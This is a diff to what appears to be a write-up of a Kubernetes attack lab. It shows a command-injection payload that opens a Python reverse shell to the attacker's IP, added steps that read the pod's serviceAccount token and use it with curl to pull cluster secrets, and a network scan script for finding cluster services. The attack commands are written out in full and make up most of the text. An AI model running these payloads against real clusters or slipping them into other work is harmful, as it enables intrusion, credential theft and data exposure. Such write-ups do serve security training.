@@ -34,7 +34,7 @@ We can try some command injection using `|` and `;`, for example we can try `; l
 Using that command injection, we can try to get a reverse shell on the server. We can use the following command:
 
 ```bash
-8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_IP>",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+8.8.8.8; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<YOUR_LOCAL_IP>",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
 ```
 
 _Don't forget to replace `<YOUR_LOCAL_IP>` by your IP address._
@@ -52,6 +52,21 @@ Notice that even if they were a firewall, the connection will be initiated from 
 
 Gaining access to the pod allow us to use it as proxy and request the cluster from an internal resource.
 
+**At this stage, the attacker should try to enumerate the cluster to find some interesting resources.**
+
+He should try to enumerate his cluster permissions, namespaces, pods, secrets, etc, using the pods serviceAccount token.
+
+```bash
+cat /var/run/secrets/kubernetes.io/serviceaccount/token
+export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+```
+
+For example, we can try to get secrets:
+
+```bash
+curl -H "Authorization: Bearer $TOKEN" "https://kubernetes.default.svc:443/api/v1/secrets" -m 3 --insecure
+```
+
 ### Discovery script
 
 I wrote a simple bash script allowing me to scan the cluster network to find kubernetes services. For information, kubernetes services default ip range is 10.96.0.0/16.
@@ -61,7 +76,7 @@ I wrote a simple bash script allowing me to scan the cluster network to find kub
 # Set the timeout value (in seconds)
 timeout=0.03
 # Loop through each IP address in the range 10.96.0.0/16
-for third_octet in {56..255}; do
+for third_octet in {89..92}; do
   for fourth_octet in {0..255}; do
     ip="10.96.$third_octet.$fourth_octet"
 
